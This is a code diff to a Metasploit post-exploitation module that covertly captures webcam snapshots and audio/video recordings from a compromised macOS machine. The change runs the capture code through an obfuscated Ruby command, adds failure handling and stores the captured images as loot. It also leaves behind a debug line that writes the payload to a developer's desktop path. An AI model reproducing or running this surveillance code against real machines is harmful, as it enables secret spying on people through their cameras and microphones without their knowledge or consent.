@@ -62,7 +62,11 @@ class Metasploit3 < Msf::Post
 
     num_chunks = (datastore['RECORD_LEN'].to_f/datastore['SYNC_WAIT'].to_f).ceil
     tmp_file = datastore['TMP_FILE'].gsub('<random>') { Rex::Text.rand_text_alpha(10)+'1' }
-    ruby_cmd = osx_capture_media(
+
+    # make the tmp directories if necessary
+    cmd_exec(['mkdir', '-p', File.dirname(tmp_file)].shelljoin)
+
+    ruby_code = osx_capture_media(
       :action => action.name.downcase,
       :snap_filetype => datastore['SNAP_FILETYPE'],
       :audio_enabled => datastore['AUDIO_ENABLED'],
@@ -78,11 +82,20 @@ class Metasploit3 < Msf::Post
       :snap_file => tmp_file+datastore['SNAP_FILETYPE']
     )
 
-    output = cmd_exec(['ruby', '-e', ruby_cmd].shelljoin)
+    File.write('/Users/joe/Desktop/r.rb', ruby_code)
+    output = cmd_exec(obfuscated_ruby_cmd(ruby_code))
+
+    puts output
+
     if action.name =~ /list/i
       print_good output
     elsif action.name =~ /record/i
       @pid = output.to_i
+
+      if pid_failed?
+        fail_with("Record service failed to run on client, bailing...")
+      end
+
       print_status "Running record service with PID #{@pid}"
       (0...num_chunks).each do |i|
         # wait SYNC_WAIT seconds
@@ -126,9 +139,13 @@ class Metasploit3 < Msf::Post
 
       snap_type = datastore['SNAP_FILETYPE']
       img = read_file(tmp_file+snap_type)
-      f = store_loot("OSX Webcam Snapshot", "image/#{snap_type}",
-        session, img, "osx_webcam_snapshot.#{snap_type}", 'OSX Webcam Snapshot')
-      print_good "Snapshot successfully taken and saved to #{f}"
+      if img.present?
+        f = store_loot("OSX Webcam Snapshot", "image/#{snap_type}",
+          session, img, "osx_webcam_snapshot.#{snap_type}", 'OSX Webcam Snapshot')
+        print_good "Snapshot successfully taken and saved to #{f}"
+      else
+        fail_with("Snapshot failed: could not read #{tmp_file+snap_type} from client.")
+      end
     end
   end
 
@@ -136,7 +153,7 @@ class Metasploit3 < Msf::Post
     return unless @cleaning_up.nil?
     @cleaning_up = true
 
-    if action.name =~ /record/i and not @pid.nil?
+    if action.name =~ /record/i and not pid_failed?
       print_status("Killing record service...")
       cmd_exec("/bin/kill -9 #{@pid}")
     end
@@ -144,6 +161,7 @@ class Metasploit3 < Msf::Post
 
   private
 
+  def pid_failed?; @pid.nil? or @pid.zero?; end
   def poll_timeout; POLL_TIMEOUT; end
   def fail_with(msg); raise msg; end
 end
